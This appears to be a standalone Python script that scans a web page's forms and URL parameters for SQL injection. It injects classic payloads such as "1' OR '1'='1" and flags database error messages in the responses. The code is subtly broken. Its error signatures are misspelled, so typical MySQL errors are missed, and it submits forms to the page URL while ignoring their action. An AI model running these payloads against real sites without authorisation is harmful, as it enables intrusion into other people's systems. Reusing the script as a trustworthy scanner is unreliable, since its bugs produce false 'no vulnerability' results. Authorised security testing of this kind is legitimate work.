# Import necessary libraries
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs

# Create a session with headers to mimic a web browser
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"

def get_forms(url):
    soup = BeautifulSoup(s.get(url).content, "html.parser")
    return soup.find_all("form")

def form_details(form):
    detailsOfForm = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get")
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({
            "type": input_type,
            "name" : input_name,
            "value" : input_value,
        })

    detailsOfForm['action'] = action
    detailsOfForm['method'] = method
    detailsOfForm['inputs'] = inputs
    return detailsOfForm

def vulnerable(response):
    errors = {"quoted string not properly terminated",
              "unclosed quotation mark after the charachter string",
              "you have an error in you SQL syntax"
             }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False

def sql_injection_scan(url):
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")

    # SQL injection payload variations for form testing
    payloads = ["'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "1' OR 1=1; --", "1\" OR 1=1; --"]

    for form in forms:
        details = form_details(form)

        # Loop through each payload for form testing
        for payload in payloads:
            data = {}
            for input_tag in details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    data[input_tag['name']] = input_tag["value"] + payload
                elif input_tag["type"] != "submit":
                    data[input_tag['name']] = f"test{payload}"

            print(url)
            form_details(form)

            if details["method"] == "post":
                res = s.post(url, data=data)
            elif details["method"] == "get":
                res = s.get(url, params=data)

            if vulnerable(res):
                print(f"SQL injection attack vulnerability found with payload '{payload}' in link: {url}")
            else:
                print(f"No SQL injection attack vulnerability detected with payload '{payload}'")

        # SQL injection payload variations for URL parameter testing
        url_params = parse_qs(urlparse(url).query)

        for param, values in url_params.items():
            for value in values:
                for payload in payloads:
                    modified_url = url.replace(f"{param}={value}", f"{param}={value}{payload}")
                    res = s.get(modified_url)

                    if vulnerable(res):
                        print(f"SQL injection attack vulnerability found with payload '{payload}' in URL: {modified_url}")
                    else:
                        print(f"No SQL injection attack vulnerability detected with payload '{payload}' in URL: {modified_url}")


if __name__ == "__main__":
    # Specify the URL to be checked for SQL injection vulnerability
    urlToBeChecked = ""
    sql_injection_scan(urlToBeChecked)
